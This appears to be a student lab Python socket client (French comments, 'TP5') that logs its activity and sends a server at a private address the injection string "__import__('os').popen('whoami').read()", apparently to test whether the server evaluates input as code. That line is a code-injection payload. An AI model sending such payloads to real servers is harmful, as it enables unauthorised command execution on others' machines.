import socket
import sys
import re
import logging
import os
# On définit la destination de la connexion
host = '10.33.66.78'  # IP du serveur
port = 13337               # Port choisir par le serveur

class CustomFormatter(logging.Formatter):

    red = "\x1b[31;20m"
    reset = "\x1b[0m"
    
    FORMATS = {
        logging.ERROR: red + "%(levelname)s %(asctime)s %(message)s" + reset,
    }

    def format(self, record):
        log_fmt = self.FORMATS.get(record.levelno) 
        formatter = logging.Formatter(log_fmt)
        return formatter.format(record)


try:
    # Create a custom logger
    logger = logging.getLogger("bs_server")
    logger.setLevel(logging.DEBUG)  # This needs to be DEBUG to capture all levels of logs

    # Create handlers
    c_handler = logging.StreamHandler()
    f_handler = logging.FileHandler('D:/Reseau-Linux/R-seau_B2/TP5/bs_client/bs_client.log')
    c_handler.setLevel(logging.ERROR)  # Set to DEBUG to ensure all levels are logged to console
    f_handler.setLevel(logging.DEBUG)  # Set to DEBUG to ensure all levels are logged to file

    # Create formatters and add it to handlers
    formatter = logging.Formatter('%(asctime)s %(levelname)s %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
    c_handler.setFormatter(CustomFormatter())
    f_handler.setFormatter(formatter)

    # Add handlers to the logger
    logger.addHandler(c_handler)
    logger.addHandler(f_handler)
except Exception as e:
    print(f"Failed to configure logging: {e}")
    sys.exit(1)

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    logger.info("Connexion réussie à %s:%s", host, port)
    s.send("Ok".encode())
    data = s.recv(1024)
    logger.info(f"Réponse reçue du serveur {host} : {repr(data)}")
    
    userMessage = "__import__('os').popen('whoami').read()"

    s.sendall(userMessage.encode("utf-8"))
    logger.info("Message envoyé au serveur %s : %s", host, userMessage)
        
    data = s.recv(1024)
    s.close()
    logger.info(f"Réponse reçue du serveur {host} : {repr(data)}")
    print(repr(data.decode()))
    sys.exit(0)
   # Assurez-vous que le socket est fermé même en cas d'erreur
except socket.error as e :
    logger.error("Impossible de se connecter au serveur %s sur le port %s", host, port)
    s.close()
    sys.exit(1)
# Close the connection.

